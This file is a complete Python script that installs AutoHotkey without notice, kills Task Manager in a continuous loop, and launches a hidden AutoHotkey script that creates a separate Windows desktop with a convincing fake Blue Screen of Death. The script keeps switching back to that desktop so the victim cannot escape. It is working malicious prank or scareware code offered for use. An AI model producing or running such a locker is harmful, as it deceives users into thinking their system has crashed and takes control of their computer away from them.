import os
import subprocess
import tempfile
import threading
import time
import psutil
import zipfile
import urllib.request
import shutil

# ================= AUTOHOTKEY CONFIG =================
AHK_URL = "https://github.com/AutoHotkey/AutoHotkey/releases/download/v2.0.19/AutoHotkey_2.0.19.zip"

AHK_DIR = os.path.join(
    os.environ["LOCALAPPDATA"],
    "Programs",
    "AutoHotkey",
    "v2"
)

AHK_EXE = os.path.join(AHK_DIR, "AutoHotkey64.exe")

# ================= AUTO INSTALL AHK (PER USER) =================
def ensure_ahk_installed():
    if os.path.exists(AHK_EXE):
        return

    temp_dir = tempfile.mkdtemp(prefix="ahk_bootstrap_")
    try:
        zip_path = os.path.join(temp_dir, "ahk.zip")
        extract_path = os.path.join(temp_dir, "extract")

        urllib.request.urlretrieve(AHK_URL, zip_path)

        with zipfile.ZipFile(zip_path, "r") as z:
            z.extractall(extract_path)

        os.makedirs(AHK_DIR, exist_ok=True)

        for root, _, files in os.walk(extract_path):
            rel = os.path.relpath(root, extract_path)
            target = AHK_DIR if rel == "." else os.path.join(AHK_DIR, rel)
            os.makedirs(target, exist_ok=True)

            for f in files:
                shutil.copy2(os.path.join(root, f), os.path.join(target, f))

    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

# Ensure AutoHotkey exists before anything else
ensure_ahk_installed()

# ================= TASK MANAGER DETECTOR =================
def watch_task_manager():
    TARGET = "Taskmgr.exe"
    seen_pids = set()

    while True:
        current_pids = set()

        for proc in psutil.process_iter(["pid", "name"]):
            if proc.info["name"] == TARGET:
                pid = proc.info["pid"]
                current_pids.add(pid)

                if pid not in seen_pids:
                    print(f"[Detector] Task Manager detected (PID {pid})")
                    proc.kill()
        seen_pids = current_pids
        time.sleep(0.2)

detector_thread = threading.Thread(target=watch_task_manager)
detector_thread.start()

# ================= AHK BSOD DESKTOP =================
ahk_script = r'''
#Requires AutoHotkey v2.0
#SingleInstance Force

DESKTOP_ALL := 0x000F01FF
DESK_NAME := "BSOD_DESK"

hDesk := DllCall(
    "CreateDesktopW",
    "wstr", DESK_NAME,
    "ptr", 0,
    "ptr", 0,
    "uint", 0,
    "uint", DESKTOP_ALL,
    "ptr", 0,
    "ptr"
)

if !hDesk {
    ExitApp
}

DllCall("SetThreadDesktop", "ptr", hDesk)
DllCall("SwitchDesktop", "ptr", hDesk)

bsodGui := Gui("+AlwaysOnTop -Caption +ToolWindow")
bsodGui.BackColor := "0078D7"
bsodGui.Show("x0 y0 w" A_ScreenWidth " h" A_ScreenHeight)

bsodGui.SetFont("s120", "Segoe UI")
bsodGui.AddText("x80 y60 cWhite", ":(")

bsodGui.SetFont("s28", "Segoe UI")
bsodGui.AddText(
    "x80 y220 cWhite",
    "Your PC ran into a problem and needs to restart.`n" .
    "We're just collecting some error info, and then we'll restart for you."
)

prog := bsodGui.AddText("x80 y340 cWhite", "0% complete")

bsodGui.SetFont("s18", "Segoe UI")
bsodGui.AddText(
    "x80 y420 cWhite",
    "For more information about this issue and possible fixes, visit`n" .
    "https://www.windows.com/stopcode`n`n" .
    "Stop code: CRITICAL_PROCESS_DIED"
)

Loop 100 {
    prog.Text := A_Index "% complete"
    Sleep 80
}

SetTimer WatchDesktop, 50

WatchDesktop() {
    global hDesk
    DllCall("SwitchDesktop", "ptr", hDesk)
}

Return
'''

# ================= WRITE TEMP AHK =================
with tempfile.NamedTemporaryFile(
    delete=False, suffix=".ahk", mode="w", encoding="utf-8"
) as f:
    f.write(ahk_script)
    ahk_file = f.name

# ================= RUN WITH INSTALLED AHK =================
subprocess.Popen(
    [AHK_EXE, ahk_file],
    creationflags=0x08000000,  # CREATE_NO_WINDOW
    close_fds=True
)

print("Locked BSOD desktop launched.")
print("Task Manager is detected continuously.")
print("Press Ctrl+C to exit.")

# ================= KEEP ALIVE =================
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    pass
